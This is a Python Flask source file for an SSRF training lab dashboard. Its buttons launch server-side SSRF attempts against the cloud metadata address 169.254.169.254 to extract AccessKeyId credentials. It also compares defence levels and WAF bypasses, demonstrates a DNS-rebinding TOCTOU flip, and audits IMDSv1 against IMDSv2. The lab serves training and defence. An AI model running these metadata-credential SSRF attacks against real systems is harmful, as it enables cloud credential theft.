"""
SSRF Lab — Dashboard  (lab component, read-only + button-driven)
================================================================
⚠️  LAB-ONLY.  A small Flask backend that serves a self-contained SOC-style
dashboard and exposes JSON APIs that run the lab's OWN checks server-side by
REUSING the toolkit (ssrf_scan, imds_check) and the existing service endpoints.

- Auto-polling is read-only (lab status + the dns-rebind /log).
- Attacks run ONLY when you press a button (the /api/* routes), always against
  our own lab services, never anything external.
- The page is fully self-contained (inline CSS/JS, no CDN) so it works offline.
"""
import html as htmllib
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

from flask import Flask, Response, jsonify, request

# Reuse the toolkit (mounted read-only at /app/toolkit) — no duplicated logic.
sys.path.insert(0, "/app/toolkit")
from ssrf_scan import CREDS_PATH, classify, payloads, probe  # noqa: E402
import imds_check  # noqa: E402

app = Flask(__name__)

APP = "http://vulnerable-app:5000"
WAF = "http://waf:8080"
META = "http://169.254.169.254"
DNS = "http://dns-rebind.lab"
REBIND_TARGET = "http://rebind.lab" + CREDS_PATH
CREDS_URL = META + CREDS_PATH
METADATA_IP = "169.254.169.254"

_BLOCK_RE = re.compile(r'<div class="blocked">.*?</b>\s*(.*?)</div>', re.S)
_PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)
_KEY_RE = re.compile(r'"AccessKeyId":\s*"([^"]+)"')

SERVICES = {
    "vulnerable-app": APP + "/",
    "waf": WAF + "/",
    "metadata": META + "/",
    "redirector": "http://preview-service.lab/health",
    "oob-listener": "http://oob-listener.lab/",
    "dns-rebind": DNS + "/state",
}


def _get(url, timeout=12):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _attack(base, level, url):
    """Run one SSRF attempt via the app and return verdict + detail."""
    query = urllib.parse.urlencode({"level": level, "url": url})
    status, body = _get(f"{base}/fetch?{query}")
    if status == 403:
        return {"verdict": "WAF-403", "detail": "blocked by the WAF (ModSecurity/CRS)"}
    if body is None:
        return {"verdict": "REQ-ERR", "detail": status or "no response"}
    verdict = classify(body)
    if verdict == "LOOT":
        m = _KEY_RE.search(htmllib.unescape((_PRE_RE.search(body) or [None, ""])[1]))
        return {"verdict": "LOOT", "detail": m.group(1) if m else "credentials returned"}
    if verdict == "BLOCKED":
        m = _BLOCK_RE.search(body)
        return {"verdict": "BLOCKED", "detail": htmllib.unescape(m.group(1).strip()) if m else ""}
    return {"verdict": verdict, "detail": ""}


@app.route("/api/status")
def api_status():
    out = {}
    for name, url in SERVICES.items():
        status, _ = _get(url, timeout=4)
        out[name] = bool(status)
    return jsonify(out)


@app.route("/api/attack")
def api_attack():
    try:
        level = int(request.args.get("level", "0"))
    except ValueError:
        level = 0
    return jsonify(_attack(APP, level, CREDS_URL))


@app.route("/api/matrix")
def api_matrix():
    rows = []
    for name, url in payloads(METADATA_IP):
        rows.append({"payload": name,
                     "cells": {f"L{lvl}": probe(APP, lvl, url) for lvl in (0, 1, 2, 3)}})
    return jsonify({"levels": ["L0", "L1", "L2", "L3"], "rows": rows})


@app.route("/api/waf")
def api_waf():
    rows = []
    for name, url in payloads(METADATA_IP):
        rows.append({"payload": name,
                     "direct": probe(APP, 0, url), "waf": probe(WAF, 0, url)})
    return jsonify({"rows": rows})


@app.route("/api/rebind")
def api_rebind():
    _get(f"{DNS}/reset", timeout=4)
    toctou = _attack(APP, 25, REBIND_TARGET)
    _s, log = _get(f"{DNS}/log", timeout=4)
    l3 = _attack(APP, 3, REBIND_TARGET)
    return jsonify({"toctou": toctou, "l3": l3,
                    "log": [x for x in (log or "").splitlines() if x.strip()]})


@app.route("/api/imds")
def api_imds():
    v1_status, _b, v1_leaked = imds_check.probe_v1(META)
    tok_status, _tok, v2_get, v2_leaked = imds_check.probe_v2(META)
    mode = "IMDSv1 (vulnerable)" if v1_leaked else (
        "IMDSv2 (enforced)" if v1_status in (401, 403) and v2_leaked else "unknown")
    return jsonify({"v1_status": v1_status, "v1_leaked": v1_leaked,
                    "v2_status": (v2_get[0] if v2_get else tok_status),
                    "v2_leaked": v2_leaked, "mode": mode})


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


PAGE = r"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>SSRF Lab — Live Dashboard</title>
<style>
  :root{--bg:#0a0f1a;--panel:#111a2b;--line:#243147;--text:#dbe4f0;--muted:#8da2bd;
    --red:#f87171;--green:#34d399;--amber:#fbbf24;--blue:#38bdf8;--violet:#a78bfa;}
  *{box-sizing:border-box}
  body{margin:0;background:radial-gradient(1100px 500px at 15% -10%,#13203a,var(--bg) 60%);
    color:var(--text);font-family:"Segoe UI",system-ui,sans-serif;padding:22px}
  h1{margin:0 0 2px;font-size:24px}.sub{color:var(--muted);margin:0 0 16px;font-size:13px}
  .badge{display:inline-block;background:var(--amber);color:#0a0f1a;font-weight:700;font-size:11px;
    letter-spacing:.05em;padding:4px 10px;border-radius:999px;text-transform:uppercase}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
  @media(max-width:860px){.grid{grid-template-columns:1fr}}
  .panel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px}
  .panel h2{margin:0 0 10px;font-size:15px}.full{grid-column:1/-1}
  button{background:linear-gradient(135deg,var(--blue),var(--violet));color:#07121f;border:0;
    border-radius:9px;padding:9px 14px;font-weight:600;cursor:pointer;font-size:13px}
  button:hover{filter:brightness(1.08)} select{background:#0a1526;color:var(--text);
    border:1px solid var(--line);border-radius:8px;padding:8px}
  .flow{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:6px 0 2px}
  .node{background:#0a1526;border:1px solid var(--line);border-radius:10px;padding:10px 12px;
    font-size:12px;min-width:92px;text-align:center}
  .node b{display:block;font-size:13px}.node .st{font-size:10px;color:var(--muted)}
  .node.up{border-color:#1f6f52}.node.down{border-color:#7f1d1d;opacity:.6}
  .arrow{font-size:13px;color:var(--muted);min-width:118px;text-align:center;transition:.3s}
  .arrow.breach{color:var(--red);font-weight:700;text-shadow:0 0 12px rgba(248,113,113,.6)}
  .arrow.blocked{color:var(--green);font-weight:700}
  .counter{font-size:13px;color:var(--muted)} .counter b{color:var(--red);font-size:20px}
  table{border-collapse:collapse;width:100%;font-size:12px}
  th,td{border:1px solid var(--line);padding:5px 7px;text-align:center}
  th{color:var(--muted);font-weight:600}.pl{text-align:left;color:var(--text)}
  .v-LOOT{background:rgba(248,113,113,.18);color:#fecaca;font-weight:700}
  .v-BLOCKED{background:rgba(52,211,153,.16);color:#bbf7d0;font-weight:700}
  .v-WAF-403{background:rgba(52,211,153,.12);color:#a7f3d0}
  .v-FETCHED{background:rgba(56,189,248,.12);color:#bae6fd}
  .v-ERROR,.v-REQ-ERR{background:rgba(148,163,184,.12);color:var(--muted)}
  .flip{display:flex;gap:10px;align-items:center;font-size:13px;margin:8px 0}
  .ip{font-family:monospace;padding:4px 8px;border-radius:7px;border:1px solid var(--line)}
  .ip.safe{color:#bbf7d0;border-color:#1f6f52}.ip.int{color:#fecaca;border-color:#7f1d1d}
  pre{background:#0a1526;border:1px solid var(--line);border-radius:8px;padding:10px;
    font-size:11px;overflow:auto;max-height:150px;color:#cbd5e1}
  .muted{color:var(--muted);font-size:12px}.hint{color:var(--muted);font-size:11px;margin-top:8px}
  .spin{color:var(--amber);font-size:12px}
</style></head><body>
  <span class="badge">⚠ Lab only · all credentials fake</span>
  <h1>🛰️ SSRF Lab — Live Dashboard</h1>
  <p class="sub">Read-only by default. Attacks run only when you press a button, against the lab's own services.</p>

  <div class="panel full">
    <h2>Lab topology & live attack path</h2>
    <div class="flow">
      <div class="node" id="n-browser"><b>Browser</b><span class="st">you</span></div>
      <div class="arrow">──▶</div>
      <div class="node up" id="n-waf"><b>WAF</b><span class="st" id="s-waf">?</span></div>
      <div class="arrow">──▶</div>
      <div class="node up" id="n-app"><b>App L0–L3</b><span class="st" id="s-app">?</span></div>
      <div class="arrow" id="hero">⟶ SSRF ⟶</div>
      <div class="node up" id="n-meta"><b>Metadata</b><span class="st">169.254.169.254</span></div>
    </div>
    <div class="flow">
      <div class="muted">internal targets:</div>
      <div class="node" id="n-red"><b>redirector</b><span class="st" id="s-redirector">?</span></div>
      <div class="node" id="n-oob"><b>oob-listener</b><span class="st" id="s-oob-listener">?</span></div>
      <div class="node" id="n-dns"><b>dns-rebind</b><span class="st" id="s-dns-rebind">?</span></div>
    </div>
    <div style="margin-top:12px;display:flex;gap:12px;align-items:center;flex-wrap:wrap">
      <span class="muted">Defense level</span>
      <select id="lvl"><option>0</option><option>1</option><option>2</option><option>3</option></select>
      <button onclick="launch()">🚀 Launch SSRF → metadata</button>
      <span class="counter">credentials exfiltrated: <b id="exfil">0</b></span>
      <span id="attack-msg" class="muted"></span>
    </div>
    <div class="hint">LOOT = creds stolen (red path) · BLOCKED/WAF-403 = stopped (green)</div>
  </div>

  <div class="grid" style="margin-top:16px">
    <div class="panel"><h2>Defense matrix L0–L3 <button onclick="matrix()">Run</button> <span id="m-spin" class="spin"></span></h2>
      <div id="matrix"><p class="muted">Press Run to scan all payloads across levels.</p></div></div>
    <div class="panel"><h2>WAF: with vs without <button onclick="waf()">Run</button> <span id="w-spin" class="spin"></span></h2>
      <div id="waf"><p class="muted">Press Run to compare direct vs through the WAF (L0).</p></div></div>
    <div class="panel"><h2>DNS rebinding (TOCTOU) <button onclick="rebind()">Run</button> <span id="r-spin" class="spin"></span></h2>
      <div id="rebind"><p class="muted">Press Run to see the TTL-0 flip: L2.5 falls, L3 holds.</p></div></div>
    <div class="panel"><h2>IMDS audit <button onclick="imds()">Run</button> <span id="i-spin" class="spin"></span></h2>
      <div id="imds"><p class="muted">Press Run to check IMDSv1 vs IMDSv2 enforcement.</p></div></div>
  </div>

<script>
const $=id=>document.getElementById(id);
async function j(u){const r=await fetch(u);if(!r.ok&&r.status!==200)throw 0;return r.json();}
function cell(v){return `<td class="v-${v}">${v}</td>`;}

async function status(){
  try{const s=await j('/api/status');
    for(const k in s){const e=$('s-'+k);if(e)e.textContent=s[k]?'up':'down';
      const n=document.getElementById('n-'+({'vulnerable-app':'app','waf':'waf','metadata':'meta','redirector':'red','oob-listener':'oob','dns-rebind':'dns'})[k]);
      if(n){n.classList.toggle('up',s[k]);n.classList.toggle('down',!s[k]);}}
  }catch(e){}
}
let exfil=0;
async function launch(){
  const lvl=$('lvl').value;$('attack-msg').textContent='running…';
  const hero=$('hero');hero.className='arrow';
  try{const r=await j('/api/attack?level='+lvl);
    if(r.verdict==='LOOT'){hero.className='arrow breach';hero.textContent='⟶ LOOT ⟶';
      exfil++;$('exfil').textContent=exfil;$('attack-msg').innerHTML='💀 '+r.detail;}
    else{hero.className='arrow blocked';hero.textContent='✋ '+r.verdict;
      $('attack-msg').textContent=r.detail||r.verdict;}
  }catch(e){$('attack-msg').textContent='error';}
}
async function matrix(){
  $('m-spin').textContent='scanning…';
  try{const d=await j('/api/matrix');let h='<table><tr><th class="pl">payload</th>'+d.levels.map(l=>`<th>${l}</th>`).join('')+'</tr>';
    d.rows.forEach(r=>{h+=`<tr><td class="pl">${r.payload}</td>`+d.levels.map(l=>cell(r.cells[l])).join('')+'</tr>';});
    $('matrix').innerHTML=h+'</table>';}catch(e){$('matrix').innerHTML='<p class="muted">error</p>';}
  $('m-spin').textContent='';
}
async function waf(){
  $('w-spin').textContent='scanning…';
  try{const d=await j('/api/waf');let h='<table><tr><th class="pl">payload</th><th>no-WAF</th><th>via-WAF</th></tr>';
    d.rows.forEach(r=>{h+=`<tr><td class="pl">${r.payload}</td>${cell(r.direct)}${cell(r.waf)}</tr>`;});
    $('waf').innerHTML=h+'</table>';}catch(e){$('waf').innerHTML='<p class="muted">error</p>';}
  $('w-spin').textContent='';
}
async function rebind(){
  $('r-spin').textContent='running…';
  try{const d=await j('/api/rebind');
    const safe=(d.log[0]||'').split('-> ')[1]||'safe';const intl=(d.log[1]||'').split('-> ')[1]||'internal';
    $('rebind').innerHTML=`<div class="flip">query #1 <span class="ip safe">${safe}</span> ✅ validated →
      query #2 <span class="ip int">${intl}</span> 🔁 flip</div>
      <table><tr><th class="pl">level</th><th>result</th></tr>
      <tr><td class="pl">L2.5 check-then-use</td>${cell(d.toctou.verdict)}</tr>
      <tr><td class="pl">L3 resolve-then-pin</td>${cell(d.l3.verdict)}</tr></table>
      <pre>${d.log.join('\n')}\n\nL3: ${d.l3.detail||''}</pre>`;
  }catch(e){$('rebind').innerHTML='<p class="muted">error</p>';}
  $('r-spin').textContent='';
}
async function imds(){
  $('i-spin').textContent='checking…';
  try{const d=await j('/api/imds');
    $('imds').innerHTML=`<table>
      <tr><th class="pl">probe</th><th>status</th><th>creds?</th></tr>
      <tr><td class="pl">IMDSv1 plain GET</td><td>${d.v1_status}</td>${cell(d.v1_leaked?'LOOT':'BLOCKED')}</tr>
      <tr><td class="pl">IMDSv2 token flow</td><td>${d.v2_status}</td>${cell(d.v2_leaked?'FETCHED':'BLOCKED')}</tr></table>
      <p class="muted">Mode: <b>${d.mode}</b></p>`;
  }catch(e){$('imds').innerHTML='<p class="muted">error</p>';}
  $('i-spin').textContent='';
}
status();setInterval(status,5000);
</script></body></html>"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
